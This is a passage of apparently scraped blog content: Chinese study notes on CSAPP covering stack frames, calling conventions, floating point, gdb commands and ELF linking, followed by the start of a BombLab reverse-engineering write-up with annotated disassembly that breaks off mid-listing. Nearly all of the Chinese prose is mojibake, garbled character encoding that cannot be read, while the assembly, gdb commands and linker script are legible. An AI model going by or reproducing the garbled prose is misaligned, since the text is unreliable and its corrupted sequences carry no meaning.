call:æŠŠripçš„å€¼è®¾ç½®æˆcalleeçš„é¦–åœ°å€ï¼Œè¿™æ ·å°±æŠŠæ‰§è¡Œæƒåˆ©è½¬æ¢ï¼Œæ¥ç€æŠŠcallæŒ‡ä»¤ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å‹å…¥æ ˆä¸­ã€‚\nretï¼šæŠŠå‹å…¥æ ˆçš„åœ°å€å¼¹å‡ºæ¥ï¼Œå¹¶ä¸”æŠŠripçš„å€¼è®¾ç½®æˆè¿™ä¸ªåœ°å€ï¼Œè¿™æ ·å°±äº¤è¿˜äº†æ§åˆ¶æƒåˆ©ã€‚\næ•°æ®ä¼ é€ï¼ˆæ€ä¹ˆç»™Calleeä¼ é€’ä¸€äº›å‚æ•°ï¼‰ # åœ¨å‚æ•°å°äº6ä¸ªçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨å¯„å­˜å™¨æ¥ä¼ é€’ï¼Œç”¨raxæ¥è·å¾—è°ƒç”¨æ–¹æ³•çš„è¿”å›å€¼å³å¯ã€‚\nåœ¨ä¸Šå›¾çš„Current frameä¸­æœ‰ä¸€ä¸ªArgument build areaï¼Œè¿™å°±æ˜¯ä¸€ä¸ªå‚æ•°æ„é€ åŒºï¼Œå¦‚æœå®ƒä¹Ÿè¦è°ƒç”¨ä¸€ä¸ªå‚æ•°å¤šäº6ä¸ªçš„æ–¹æ³•ï¼Œé‚£ä¹ˆå°±è¦æå‰åœ¨è‡ªå·±çš„æ ˆå¸§é‡Œå‡†å¤‡å¥½ï¼Œå†æ‰§è¡ŒcallæŒ‡ä»¤ï¼ˆæ³¨æ„ï¼šç¬¬ä¸ƒä¸ªå‚æ•°ä¼šåœ¨æ ˆçš„é¡¶éƒ¨ï¼‰ã€‚\næ ˆä¸Šçš„å±€éƒ¨å­˜å‚¨ï¼ˆCalleeä¸­çš„å±€éƒ¨å˜é‡æ˜¯æ€ä¹ˆå®ç°çš„ï¼‰ # æ¯”å¦‚å±€éƒ¨å˜é‡å¤ªå¤šï¼Œè¦å–å±€éƒ¨å˜é‡çš„ä¸€ä¸ªåœ°å€ï¼Œæˆ–è€…å±€éƒ¨å˜é‡æ˜¯æ•°ç»„åŠç»“æ„ä½“ç­‰ã€‚\nè¿˜æ˜¯ä¸Šå›¾ï¼Œå‚æ•°æ„é€ åŒºä¹‹ä¸Šå°±æ˜¯æˆ‘ä»¬å‡å°‘æ ˆæŒ‡é’ˆåˆ†é…ç»™å±€éƒ¨å˜é‡çš„ç©ºé—´ã€‚\nä¸‹ä¾‹å‡ºè‡ªCSAPP\nlong swap_add (long *XP , long * yp) { long x = *xp ; long y = * yp ; *xp = y ; *yp = x ; return x + y ; } long caller () { //è¦å¤„ç†ä»¥ä¸‹ä¸¤ä¸ªå±€éƒ¨å˜é‡ï¼Œæˆ‘å°±è¦ä¸ºä»–ä»¬äº§ç”Ÿåœ°å€ã€‚ long argl = 534 ; long arg2 = 1057 ; long sum = swap_add (\u0026amp;argl , \u0026amp;arg2) ; long diff = argl - arg2 ; return sum * diff; } ä»¥ä¸‹æ˜¯æ±‡ç¼–ä»£ç \nlong caller() caller: subq $16 , %rsp movq $534 , (%rsp) movq $1057 , 8(%rsp) leaq 8(%rsp) , %rsi movq %rsp , %rdi call swap_add\t;è¿™é‡Œçš„ç»†èŠ‚ï¼šæ–¹æ³•è™½ç„¶å·²ç»è¿”å›ï¼ˆè¿”å›ä¹‹åä¹‹å‰å‹å…¥çš„è¿”å›åœ°å€å°±ä¼šè¢«å¼¹å‡ºï¼‰ï¼Œä½†æ˜¯æ ˆå¸§è¿˜åœ¨ï¼Œæ‰€ä»¥åˆ†é…çš„å±€éƒ¨å˜é‡è¿˜åœ¨ movq (%rsp) , %rdx subq 8(%rsp) ,%rdx imulq %rdx , %rax addq $16 , %rsp\t;æ­¤æ—¶æ ˆå¸§ä¸å­˜åœ¨ï¼Œä¼šè¢«åæ¥çš„dataè¦†ç›–æ‰ ret æ ˆå¸§åˆ†é…åˆ°åº•æ‹¿æ¥å¹²å˜›äº†ï¼Ÿ\nçœ‹ä¸‹å›¾ï¼š\nåˆ†é…æ ˆå¸§ï¼Œå…ˆç”¨æ¥å­˜æ”¾æœ¬æ–¹æ³•è¦ç”¨çš„å±€éƒ¨å˜é‡ï¼Œæ¥ç€æ˜¯å¤šäº6ä¸ªçš„å‚æ•°ä»å³è‡³å·¦ä¾æ¬¡å‹å…¥æ ˆä¸­ï¼Œç„¶åcallï¼Œæ³¨æ„ï¼Œä¸è¦æ··æ·†å±€éƒ¨å˜é‡å’Œä¼ é€’çš„å‚æ•°ï¼Œåœ¨è¢«è°ƒç”¨çš„æ–¹æ³•ä¸­æ˜¯ä¸ä¼šç”¨å‰ä¸€ä¸ªæ–¹æ³•æ ˆå¸§ä¸­çš„å±€éƒ¨å˜é‡çš„ã€‚\nå¯„å­˜å™¨ä¸­çš„å±€éƒ¨å­˜å‚¨ç©ºé—´ # ğŸ”¹ è¿™äº›å¯„å­˜å™¨ä¸»è¦ç”¨äºä»€ä¹ˆï¼Ÿ # 1. å­˜å‚¨å±€éƒ¨å˜é‡ # ï¼ˆè¿™ä¹Ÿæ˜¯ä¸€ç§å­˜å‚¨å±€éƒ¨å˜é‡çš„æ–¹æ³•ï¼Œæ¯”å¦‚åœ¨forå¾ªç¯ä¸­çš„indexï¼‰\nå¦‚æœä¸€ä¸ªå‡½æ•°æœ‰å±€éƒ¨å˜é‡ï¼Œä½†å¯„å­˜å™¨åˆ†é…ä¸è¶³ï¼Œç¼–è¯‘å™¨å¯èƒ½ä¼šæŠŠä¸€äº›å˜é‡ä¿å­˜åœ¨è¢«è°ƒç”¨è€…ä¿å­˜å¯„å­˜å™¨é‡Œï¼Œé¿å…é¢‘ç¹è®¿é—®æ ˆï¼ˆæ¯”æ ˆä¸Šçš„å˜é‡è®¿é—®å¿«ï¼‰ã€‚\n2. ç»´æŒé•¿æœŸå˜é‡ï¼ˆLong-lived variablesï¼‰ # å¦‚æœæŸä¸ªå˜é‡åœ¨æ•´ä¸ªå‡½æ•°ç”Ÿå‘½å‘¨æœŸå†…éƒ½ä¼šè¢«ä½¿ç”¨ï¼Œè€Œéä¸´æ—¶æ•°æ®ï¼Œå°±å¯èƒ½æ”¾åœ¨ %rbxã€%r12-%r15 è¿™äº›å¯„å­˜å™¨é‡Œã€‚\n3. ç»´æŠ¤æ ˆå¸§æŒ‡é’ˆï¼ˆ%rbpï¼‰ # è™½ç„¶ç°ä»£ç¼–è¯‘å™¨å¯èƒ½ä¼šçœç•¥æ ˆå¸§æŒ‡é’ˆï¼ˆFrame Pointer Omission, FPOï¼‰ï¼Œä½†åœ¨è°ƒè¯•æ¨¡å¼ä¸‹ï¼Œ%rbp ä»ç„¶ç”¨äºä¿æŒå½“å‰å‡½æ•°çš„æ ˆåŸºå€ï¼Œå¸®åŠ©å›æº¯è°ƒç”¨æ ˆã€‚\n4. ä¼ é€’è·¨å‡½æ•°è°ƒç”¨çš„å€¼ # åœ¨ä¸€äº›æƒ…å†µä¸‹ï¼Œå¦‚æœä¸€ä¸ªå€¼éœ€è¦åœ¨å¤šä¸ªå‡½æ•°è°ƒç”¨ä¹‹é—´ä¿æŒä¸å˜ï¼Œå°±å¯èƒ½å­˜å…¥è¢«è°ƒç”¨è€…ä¿å­˜å¯„å­˜å™¨ï¼Œæ¯”å¦‚ï¼š\né€’å½’å‡½æ•°ä¸­ï¼ŒæŸäº›å‚æ•°å¯èƒ½éœ€è¦è·¨å¤šæ¬¡é€’å½’è°ƒç”¨ä¿æŒä¸å˜ã€‚ åœ¨åç¨‹æˆ–ä¸Šä¸‹æ–‡åˆ‡æ¢çš„ä»£ç é‡Œï¼ŒæŸäº›å¯„å­˜å™¨å¯èƒ½å­˜å‚¨ç‰¹å®šçš„ä»»åŠ¡çŠ¶æ€ã€‚ é€’å½’è¿‡ç¨‹ # åˆ°è¿™é‡Œï¼Œç†è§£é€’å½’è¿‡ç¨‹å°±æ˜¯ç®€å•çš„äº†ï¼Œè°ƒç”¨è‡ªå·±å’Œè°ƒç”¨ä»»ä½•ä¸€ä¸ªè¿‡ç¨‹éƒ½æ˜¯ç±»ä¼¼çš„ï¼Œæ¯ä¸ªå‡½æ•°éƒ½æœ‰è‡ªå·±çš„ç§æœ‰çš„æ ˆå¸§ã€‚\næˆ‘ä»¬éš¾ç†è§£çš„æƒ…å†µæ˜¯æ ˆå¸§é‡Œä¸œè¥¿å¤ªå¤æ‚çš„æƒ…å†µã€‚\næ•°ç»„çš„åˆ†é…å’Œè®¿é—® # 1.æŒ‡é’ˆè®¿é—®ï¼Œå¦‚æœæ˜¯åœ°å€ï¼Œå°±ç”¨leaqåŠ è½½æœ‰æ•ˆåœ°å€ï¼Œå¦‚æœæ˜¯å–å€¼å°±ç”¨movæŒ‡ä»¤å³å¯ã€‚\n2.å¤šç»´æ•°ç»„\n3.å®šé•¿å˜é•¿æ•°ç»„ä»¥åŠç»“æ„ä½“\nå…³äºç¼“å†²åŒºæº¢å‡ºé—®é¢˜ # Cè¯­è¨€åŸºç¡€ # å…³äºä½è¿ç®—çš„æŠ€å·§\nå®å®šä¹‰å‡½æ•°å¤šè¡Œç”¨\\åˆ†å¼€ï¼Œç”¨do {\u0026hellip;\u0026hellip;} while(0)åƒæ‰;ï¼ˆç»†èŠ‚é—®é¢˜ï¼‰\nå†…è”å‡½æ•°ï¼šç±»ä¼¼å®å®šä¹‰ï¼Œè°ƒç”¨çš„å‡½æ•°ä¸è·³è½¬ï¼Œç›´æ¥å±•å¼€ï¼ŒèŠ‚çº¦èµ„æºï¼ˆæ ¹æ®ç¼–è¯‘å™¨çš„æƒ…å†µè€Œå®š)\nstatic inline int(...){......}\t//ä¸€èˆ¬è¿™æ ·å®šä¹‰åœ¨å¤´æ–‡ä»¶é‡Œä½¿ç”¨ å…³äºCè¯­è¨€ä¸å†èµ˜è¿°\næµ®ç‚¹æ•°è¯¦è§£ # æµ®ç‚¹æ•°å­˜å‚¨å½¢å¼ # ï¼ˆå°æ•°ç‚¹æµ®åŠ¨ï¼‰è¿›åˆ¶è½¬æ¢ï¼ˆæ•°å­—ç”µè·¯å†…å®¹ï¼‰\n[!NOTE]\nIEEE754å…¸ä¸­å…¸\nè¿™é‡Œçš„å°¾æ•°å…¶å®æŒ‡çš„å°±æ˜¯å°æ•°ç‚¹ä¹‹åçš„äºŒè¿›åˆ¶è¡¨ç¤ºï¼š\næ¯”å¦‚2.5 = 10.1b\nå³ $$ 2.5 = 1.01*2^1 $$\n[!NOTE]\nè¿™æ˜¯ä¸€ä¸ªè§„æ ¼åŒ–çš„æµ®ç‚¹æ•°ï¼Œæ‰€è°“è§„æ ¼åŒ–ï¼Œæˆ‘ä»¬é»˜è®¤ä¸€ä¸ªæµ®ç‚¹æ•°æ˜¯å¤§äº1çš„ï¼Œå³æœ‰ä¸€ä¸ªéšå«çš„å‰å¯¼1,æˆ‘ä»¬åªåœ¨å°¾æ•°çš„23ä½ä¸­å­˜å‚¨å°æ•°ç‚¹çš„éƒ¨åˆ†å³å¯ï¼Œä½†æ˜¯å¦‚æœæŒ‡æ•°éƒ¨åˆ†ä¸º0,ä½†æ˜¯å°¾æ•°ä¸ä¸º0,è¿™å°±æ˜¯ä¸€ä¸ªéè§„æ ¼åŒ–çš„æµ®ç‚¹æ•°ï¼Œè®¡ç®—çš„è§„åˆ™å·²ç»å‘ç”Ÿäº†æ”¹å˜ï¼Œæ­¤æ—¶çš„æŒ‡æ•°ä¸º1-biasï¼Œä¸ºäº†äº§ç”Ÿå¹³æ»‘çš„è¿‡æ¸¡ã€‚\néè§„æ ¼åŒ–æµ®ç‚¹æ•°åŠèˆå…¥çš„é—®é¢˜ # èˆå…¥ï¼šå°±è¿‘èˆå…¥ï¼Œç›¸åŒ0ä¼˜å…ˆ\næŒ‡æ•°éƒ¨åˆ†è¶Šå¤§ï¼Œå¯†åº¦å˜å°ï¼Œç²¾åº¦å°±ä¼šå˜ä½\næµ®ç‚¹æ•°çš„è¿ç®— # å…ˆæŠŠæŒ‡æ•°è®¾ç½®ç›¸åŒï¼Œå†ç›¸åŠ è¿™ä¼šå¯¼è‡´å¤§æ•°åƒæ‰å°æ•°çš„æƒ…å†µäº§ç”Ÿ\né‡‡ç”¨å¦‚ä¸‹çš„ç´¯åŠ ç®—æ³•\næ¯”è¾ƒé—®é¢˜ï¼š0.1 + 0.2 != 0.3ï¼ˆæ— é™ä¸å¾ªç¯å°æ•°ç›¸åŠ å¯¼è‡´çš„ï¼‰\n[!NOTE]\nè¿˜æœ‰ä¸€ä¸ªå€¼å¾—æ³¨æ„çš„ç‚¹æ˜¯è½¬æ¢ç±»å‹æ—¶å€™çš„æœ€è¿‘å¶æ•°èˆå…¥ï¼ˆé“¶è¡Œå®¶èˆå…¥ï¼‰ï¼Œè¿™æœ‰åˆ©äºå‡å°‘ç´¯ç§¯èˆå…¥çš„è¯¯å·®ã€‚\nè¯¾åä½œä¸š # æ­¤æ—¶æˆ‘ä»¬å»åšCSAPPçš„3ä¸ªlabï¼Œå¹¶ä¸”æŠŠCSAPP2,3ç« çš„è¯¾åä¹ é¢˜éƒ½è§£å†³ä¸€éï¼ˆæˆ‘æ‡’çš„å†™ç¬¬äºŒç« äº†ï¼Œæˆ‘åªå†™ä¸€ä¸‹ç¬¬ä¸‰ç« çš„å†…å®¹ï¼‰\n1.datalab\n2.bomblabï¼ˆgdbçš„ä½¿ç”¨ï¼Œå¾ˆæœ‰éš¾åº¦,æˆ‘è§‰å¾—å¯ä»¥å…ˆå¤šçœ‹çœ‹ä¹¦ï¼Œåšä¸€ä¸‹ç»ƒä¹ å’Œè¯¾åä¹ é¢˜ï¼Œç†è§£ä¹‹åå†å»ä¸Šæ‰‹ï¼‰\ngdbå¸¸ç”¨æŒ‡ä»¤ï¼ˆæ¥è‡ªhttps://arthals.ink/blog/bomb-labä½œä¸ºå‚è€ƒçš„blogï¼‰\np $rax # æ‰“å°å¯„å­˜å™¨ rax çš„å€¼ p $rsp # æ‰“å°æ ˆæŒ‡é’ˆçš„å€¼ p/x $rsp # æ‰“å°æ ˆæŒ‡é’ˆçš„å€¼ï¼Œä»¥åå…­è¿›åˆ¶æ˜¾ç¤º p/d $rsp # æ‰“å°æ ˆæŒ‡é’ˆçš„å€¼ï¼Œä»¥åè¿›åˆ¶æ˜¾ç¤º x/2x $rsp # ä»¥åå…­è¿›åˆ¶æ ¼å¼æŸ¥çœ‹æ ˆæŒ‡é’ˆ %rsp æŒ‡å‘çš„å†…å­˜ä½ç½® M[%rsp] å¼€å§‹çš„ä¸¤ä¸ªå•ä½ã€‚ x/2d $rsp # ä»¥åè¿›åˆ¶æ ¼å¼æŸ¥çœ‹æ ˆæŒ‡é’ˆ %rsp æŒ‡å‘çš„å†…å­˜ä½ç½® M[%rsp] å¼€å§‹çš„ä¸¤ä¸ªå•ä½ã€‚ x/2c $rsp # ä»¥å­—ç¬¦æ ¼å¼æŸ¥çœ‹æ ˆæŒ‡é’ˆ %rsp æŒ‡å‘çš„å†…å­˜ä½ç½® M[%rsp] å¼€å§‹çš„ä¸¤ä¸ªå•ä½ã€‚ x/s $rsp # æŠŠæ ˆæŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä½ç½® M[%rsp] å½“ä½œ C é£æ ¼å­—ç¬¦ä¸²æ¥æŸ¥çœ‹ã€‚ x/b $rsp # æ£€æŸ¥æ ˆæŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä½ç½® M[%rsp] å¼€å§‹çš„ 1 å­—èŠ‚ã€‚ x/h $rsp # æ£€æŸ¥æ ˆæŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä½ç½® M[%rsp] å¼€å§‹çš„ 2 å­—èŠ‚ï¼ˆåŠå­—ï¼‰ã€‚ x/w $rsp # æ£€æŸ¥æ ˆæŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä½ç½® M[%rsp] å¼€å§‹çš„ 4 å­—èŠ‚ï¼ˆå­—ï¼‰ã€‚ x/g $rsp # æ£€æŸ¥æ ˆæŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä½ç½® M[%rsp] å¼€å§‹çš„ 8 å­—èŠ‚ï¼ˆåŒå­—ï¼‰ã€‚ info registers # æ‰“å°æ‰€æœ‰å¯„å­˜å™¨çš„å€¼ info breakpoints # æ‰“å°æ‰€æœ‰æ–­ç‚¹çš„ä¿¡æ¯ delete breakpoints 1 # åˆ é™¤ç¬¬ä¸€ä¸ªæ–­ç‚¹ï¼Œå¯ä»¥ç®€å†™ä¸º d 1 3.attacklabï¼ˆæ¨¡æ‹Ÿæ”»å‡»ï¼‰\n[!NOTE]\nä¸Šè¿°å·¥ä½œä¼šèŠ±è´¹å¾ˆé•¿æ—¶é—´ï¼Œä½†æ˜¯æ¬²é€Ÿåˆ™ä¸è¾¾ï¼Œå¦‚æœéš¾ä»¥ä¸‹æ‰‹ï¼Œä½ å¯ä»¥å‚è€ƒCSDIYä¸Šçš„ä¸€äº›æ¨èåšå®¢ã€‚\né“¾æ¥ç®€å•è§£è¯» # Static Linking # å¯ä»¥ç†è§£æ˜¯æ€ä¹ˆæŠŠä½ å†™çš„å¤šæ–‡ä»¶ç¨‹åºæ•´åˆåœ¨ä¸€èµ·è¿è¡Œã€‚\nå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶çš„åˆ†æ(Relocatable File) # å•ä¸ªæ–‡ä»¶æ±‡ç¼–ä¹‹åï¼Œåç¼€ä¸º.oçš„æ–‡ä»¶å°±æ˜¯ä¸€ä¸ªå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ã€‚\nï¼ˆç”¨ä»¥ä¸‹çš„ä¸¤ä¸ªç¨‹åºï¼‰\nreadelf -a main.o\t//åˆ†æelfæ–‡ä»¶å†…å®¹ hexdump -C main.o\t//ç›´æ¥æŸ¥çœ‹æ–‡ä»¶çš„äºŒè¿›åˆ¶ä¿¡æ¯ ç¬¦å·è¡¨ä¿¡æ¯ # å¼±ç¬¦å·å’Œå¼ºç¬¦å· # å¯æ‰§è¡Œæ–‡ä»¶ # æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶çš„Program Headerï¼ˆå¯æ‰§è¡Œæ–‡ä»¶æ˜¯æ€ä¹ˆè¢«åŠ è½½æ‰§è¡Œçš„ï¼Ÿï¼‰\nProgram Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align LOAD 0x001020 0x00800020 0x00800020 0x00198 0x00198 R E 0x1000 LOAD 0x002000 0x00801000 0x00801000 0x00038 0x00050 RW 0x1000 GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x10 Section to Segment mapping: Segment Sections... 00 .text .rodata 01 .data .bss 02 é™æ€é“¾æ¥çš„è¿‡ç¨‹ # /* Simple linker script for os user-level programs. See the GNU ld \u0026#39;info\u0026#39; manual (\u0026#34;info ld\u0026#34;) to learn the syntax. */ //ä¸€ä¸ªç®€å•çš„linkerè„šæœ¬ OUTPUT_FORMAT(\u0026#34;elf32-i386\u0026#34;, \u0026#34;elf32-i386\u0026#34;, \u0026#34;elf32-i386\u0026#34;)\t//è¾“å‡ºæ ¼å¼ OUTPUT_ARCH(i386)\t//æ¶æ„ç±»å‹ ENTRY(main)\t//ç¨‹åºçš„å…¥å£ç‚¹ï¼ˆmainå‡½æ•°ï¼‰ SECTIONS { /* Load programs at this address: \u0026#34;.\u0026#34; means the current address */ //åœ¨è¿™ä¸ªåœ°å€å¯¹ç¨‹åºè¿›è¡ŒåŠ è½½ . = 0x800020; //ä»¥ä¸‹éƒ½æ˜¯æŠŠæ¯ä¸ªç›®æ ‡æ–‡ä»¶ä¸­çš„ç›¸åŒçš„æ®µåˆå¹¶åˆ°æ–°çš„æ®µ .text : { *(.text .stub .text.* .gnu.linkonce.t.*) } PROVIDE(etext = .); /* Define the \u0026#39;etext\u0026#39; symbol to this value */ .rodata : { *(.rodata .rodata.* .gnu.linkonce.r.*) } /* Adjust the address for the data segment to the next page */ //è½¬é¡µè¿›è¡Œå­˜å‚¨ï¼Œä»¥ä¸Šçš„é¡µå°±å¯ä»¥è®¾ç½®æˆroçš„ä¸€ä¸ªé¡µ . = ALIGN(0x1000); .data : { *(.data) } //è®°å½•ä¸‹æ¥ï¼ŒæŠŠ.bssæ®µè®¾ç½®æˆ0 PROVIDE(edata = .); .bss : { *(.bss) } PROVIDE(end = .); /DISCARD/ : { *(.eh_frame .note.GNU-stack .comment) } } é‡å®šä½ä¿¡æ¯ # ","date":"10 March 2025","externalUrl":null,"permalink":"/tech/computerorgnization/","section":"Tech","summary":"","title":"ComputerOrgnization","type":"tech"},{"content":" CSAPP:BombLab # [!NOTE]\næœ¬æ–‡ä¸»è¦å‚è€ƒåšå®¢ï¼šarthals.inkï¼Œå¦‚æœä½ è¦å­¦ä¹ æ–¹æ³•ï¼Œä½ åªè¦çœ‹TAå†™çš„å°±å¯ä»¥äº†ï¼Œæˆ‘åªçœ‹äº†å‰ä¸¤å±‚ï¼Œ åªæ˜¯åšä¸ªè®°å½•ï¼Œæˆ‘è®¤ä¸ºå¯¹äºæˆ‘æ¥è¯´å¾ˆå¥½çš„è§£å†³é—®é¢˜æ–¹å¼å°±æ˜¯å†™æ³¨é‡Š(æ‰€ä»¥æˆ‘è¿™é‡Œæœ‰é€è¡Œçš„æ³¨é‡Š)ã€‚\ngdbæŒ‡ä»¤ï¼š\np $rax # æ‰“å°å¯„å­˜å™¨ rax çš„å€¼ p $rsp # æ‰“å°æ ˆæŒ‡é’ˆçš„å€¼ p/x $rsp # æ‰“å°æ ˆæŒ‡é’ˆçš„å€¼ï¼Œä»¥åå…­è¿›åˆ¶æ˜¾ç¤º p/d $rsp # æ‰“å°æ ˆæŒ‡é’ˆçš„å€¼ï¼Œä»¥åè¿›åˆ¶æ˜¾ç¤º x/2x $rsp # ä»¥åå…­è¿›åˆ¶æ ¼å¼æŸ¥çœ‹æ ˆæŒ‡é’ˆ %rsp æŒ‡å‘çš„å†…å­˜ä½ç½® M[%rsp] å¼€å§‹çš„ä¸¤ä¸ªå•ä½ã€‚ x/2d $rsp # ä»¥åè¿›åˆ¶æ ¼å¼æŸ¥çœ‹æ ˆæŒ‡é’ˆ %rsp æŒ‡å‘çš„å†…å­˜ä½ç½® M[%rsp] å¼€å§‹çš„ä¸¤ä¸ªå•ä½ã€‚ x/2c $rsp # ä»¥å­—ç¬¦æ ¼å¼æŸ¥çœ‹æ ˆæŒ‡é’ˆ %rsp æŒ‡å‘çš„å†…å­˜ä½ç½® M[%rsp] å¼€å§‹çš„ä¸¤ä¸ªå•ä½ã€‚ x/s $rsp # æŠŠæ ˆæŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä½ç½® M[%rsp] å½“ä½œ C é£æ ¼å­—ç¬¦ä¸²æ¥æŸ¥çœ‹ã€‚ x/b $rsp # æ£€æŸ¥æ ˆæŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä½ç½® M[%rsp] å¼€å§‹çš„ 1 å­—èŠ‚ã€‚ x/h $rsp # æ£€æŸ¥æ ˆæŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä½ç½® M[%rsp] å¼€å§‹çš„ 2 å­—èŠ‚ï¼ˆåŠå­—ï¼‰ã€‚ x/w $rsp # æ£€æŸ¥æ ˆæŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä½ç½® M[%rsp] å¼€å§‹çš„ 4 å­—èŠ‚ï¼ˆå­—ï¼‰ã€‚ x/g $rsp # æ£€æŸ¥æ ˆæŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä½ç½® M[%rsp] å¼€å§‹çš„ 8 å­—èŠ‚ï¼ˆåŒå­—ï¼‰ã€‚ info registers # æ‰“å°æ‰€æœ‰å¯„å­˜å™¨çš„å€¼ info breakpoints # æ‰“å°æ‰€æœ‰æ–­ç‚¹çš„ä¿¡æ¯ delete breakpoints 1 # åˆ é™¤ç¬¬ä¸€ä¸ªæ–­ç‚¹ï¼Œå¯ä»¥ç®€å†™ä¸º d 1 phase1: # æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯å¯¹æ¯”ä¸€ä¸‹å­—ç¬¦ä¸²ï¼Œç†Ÿæ‚‰ä¸€ä¸‹ã€‚\n00000000000015ab \u0026lt;phase_1\u0026gt;: 15ab:\tf3 0f 1e fa endbr64 15af:\t48 83 ec 08 sub $0x8,%rsp 15b3:\t48 8d 35 f2 1a 00 00 lea 0x1af2(%rip),%rsi # è¿™å¾ˆç®€å•ï¼Œä½ åªè¦æŸ¥çœ‹rsié‡Œé¢å­˜æ”¾äº†ä»€ä¹ˆä¸œè¥¿å°±å¯ä»¥ 15ba:\te8 f3 05 00 00 call 1bb2 \u0026lt;strings_not_equal\u0026gt; 15bf:\t85 c0 test %eax,%eax 15c1:\t75 05 jne 15c8 \u0026lt;phase_1+0x1d\u0026gt; 15c3:\t48 83 c4 08 add $0x8,%rsp 15c7:\tc3 ret 15c8:\te8 f9 06 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 15cd:\teb f4 jmp 15c3 \u0026lt;phase_1+0x18\u0026gt; phase2: # å…ˆçœ‹phase_2çš„ä»£ç ï¼Œè¿™æ˜¯å…¸å‹çš„å¾ªç¯\n00000000000015cf \u0026lt;phase_2\u0026gt;: 15cf:\tf3 0f 1e fa endbr64 # ç”¨æ¥é˜²æ­¢ROPæ”»å‡» 15d3:\t55 push %rbp # ä¸¤ä¸ªå±€éƒ¨å˜é‡ 15d4:\t53 push %rbx 15d5:\t48 83 ec 28 sub $0x28,%rsp # åˆ†é…äº†40ä¸ªå­—èŠ‚ 15d9:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax # é‡‘ä¸é›€å€¼ï¼Œç”¨æ¥é˜²æ­¢æ¶æ„ä¿®æ”¹ 15e0:\t00 00 15e2:\t48 89 44 24 18 mov %rax,0x18(%rsp) # æŠŠé‡‘ä¸é›€å€¼ä¿å­˜èµ·æ¥ï¼Œè¿™æ ·è¢«ä¿®æ”¹çš„æ—¶å€™å°±ä¼šæé†’ 15e7:\t31 c0 xor %eax,%eax # ??? 15e9:\t48 89 e6 mov %rsp,%rsi # æ ˆæŒ‡é’ˆçš„å€¼èµ‹ç»™äº†rsi 15ec:\te8 2d 07 00 00 call 1d1e \u0026lt;read_six_numbers\u0026gt; # è°ƒç”¨ä¸€ä¸ªè¯»å–6ä¸ªæ•°å­—çš„å‡½æ•° 15f1:\t83 3c 24 01 cmpl $0x1,(%rsp) # ç¬¬ä¸€ä¸ªæ•°å­—ä¸º1 15f5:\t75 0a jne 1601 \u0026lt;phase_2+0x32\u0026gt; 15f7:\t48 89 e3 mov %rsp,%rbx # rbxä¸ºå½“å‰æ ˆé¡¶çš„åœ°å€ 15fa:\t48 8d 6c 24 14 lea 0x14(%rsp),%rbp # rbpå­˜æ”¾rsp + 20bytesçš„åœ°å€ 0 4 8 12 16 20åˆšå¥½å…­ä¸ªæ•°å­—ç”¨æ ˆä¼ é€’ 15ff:\teb 10 jmp 1611 \u0026lt;phase_2+0x42\u0026gt; # æ— æ¡ä»¶è·³è½¬1611 1601:\te8 c0 06 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1606:\teb ef jmp 15f7 \u0026lt;phase_2+0x28\u0026gt; 1608:\t48 83 c3 04 add $0x4,%rbx # ç›¸ç­‰çš„æƒ…å†µä¸‹è€ƒå¯Ÿç¬¬äºŒä¸ªå‚æ•°çš„æƒ…å†µ 160c:\t48 39 eb cmp %rbp,%rbx # å¾ªç¯ç»ˆæ­¢æ¡ä»¶ 160f:\t74 10 je 1621 \u0026lt;phase_2+0x52\u0026gt; 1611:\t8b 03 mov (%rbx),%eax # å–ç¬¬ä¸€ä¸ªå‚æ•°åˆ°eax 1613:\t01 c0 add %eax,%eax # eax = eax * 2 1615:\t39 43 04 cmp %eax,0x4(%rbx) # å’Œç¬¬äºŒä¸ªå‚æ•°ä½œæ¯”è¾ƒ 1618:\t74 ee je 1608 \u0026lt;phase_2+0x39\u0026gt; # ç›¸ç­‰ç»§ç»­ï¼Œä¸ç›¸ç­‰çˆ†ç‚¸ 161a:\te8 a7 06 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 161f:\teb e7 jmp 1608 \u0026lt;phase_2+0x39\u0026gt; 1621:\t48 8b 44 24 18 mov 0x18(%rsp),%rax 1626:\t64 48 2b 04 25 28 00 sub %fs:0x28,%rax 162d:\t00 00 162f:\t75 07 jne 1638 \u0026lt;phase_2+0x69\u0026gt; 1631:\t48 83 c4 28 add $0x28,%rsp 1635:\t5b pop %rbx 1636:\t5d pop %rbp 1637:\tc3 ret 1638:\te8 13 fc ff ff call 1250 \u0026lt;__stack_chk_fail@plt\u0026gt; å†çœ‹å®ƒè°ƒç”¨çš„è¯»å–å…­ä¸ªæ•°å­—çš„function\n0000000000001d1e \u0026lt;read_six_numbers\u0026gt;: 1d1e:\tf3 0f 1e fa endbr64 1d22:\t48 83 ec 08 sub $0x8,%rsp # å†åˆ†é…8ä¸ªå­—èŠ‚ 1d26:\t48 89 f2 mov %rsi,%rdx # è®°ä½rsiæ˜¯ä¸Šä¸€å±‚æ ˆé¡¶çš„ä½ç½®æ”¾åˆ°rdxè¿™é‡Œ 1d29:\t48 8d 4e 04 lea 0x4(%rsi),%rcx # æŠŠè¿™äº›å‚æ•°ç”¨å¯„å­˜å™¨å‘ä¸‹ä¸€ä¸ªsscanfä¼ é€’ 1d2d:\t48 8d 46 14 lea 0x14(%rsi),%rax 1d31:\t50 push %rax 1d32:\t48 8d 46 10 lea 0x10(%rsi),%rax 1d36:\t50 push 